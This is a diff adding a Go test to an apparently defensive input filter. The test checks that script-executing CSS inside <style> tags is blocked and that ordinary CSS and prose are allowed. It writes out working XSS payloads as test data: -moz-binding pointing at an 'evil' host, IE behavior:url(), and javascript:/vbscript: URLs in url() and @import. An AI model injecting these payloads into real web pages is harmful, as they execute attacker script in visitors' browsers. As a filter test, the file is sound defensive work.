@@ -111,3 +111,40 @@ func TestSymbolicLogicalSQLiBlocked(t *testing.T) {
 		})
 	}
 }
+
+// TestCSSScriptExecutionBlocked covers script-executing CSS constructs inside
+// a <style> tag (which XSS-013 missed — it only handled style= attributes):
+// -moz-binding, IE behavior:url(), and javascript:/vbscript: in url(). It must
+// NOT fire on external @import/url() (Google Fonts, CDNs) which are legitimate.
+func TestCSSScriptExecutionBlocked(t *testing.T) {
+	eng := newFuzzEngine(t)
+	mal := []string{
+		"<style>a{-moz-binding:url(//evil/x.xml#x)}</style>",
+		"<style>b{behavior:url(evil.htc)}</style>",
+		"<style>c{background:url(javascript:alert(1))}</style>",
+		"<style>d{background:url('vbscript:msgbox')}</style>",
+		"<style>@import url('javascript:alert(1)')</style>",
+	}
+	for _, p := range mal {
+		p := p
+		t.Run("block_"+p, func(t *testing.T) {
+			if !rceBodyBlocked(eng, p) {
+				t.Errorf("malicious CSS construct not blocked: %q", p)
+			}
+		})
+	}
+	legit := []string{
+		"<style>@import url('https://fonts.googleapis.com/css?family=Roboto');</style>",
+		"<style>.hdr{background:url('//cdn.example.com/bg.png')}</style>",
+		"<style>body{color:#333;margin:0}</style>",
+		"the behavior of the app changed yesterday",
+	}
+	for _, p := range legit {
+		p := p
+		t.Run("allow_"+p, func(t *testing.T) {
+			if rceBodyBlocked(eng, p) {
+				t.Errorf("legit CSS/prose wrongly blocked: %q", p)
+			}
+		})
+	}
+}
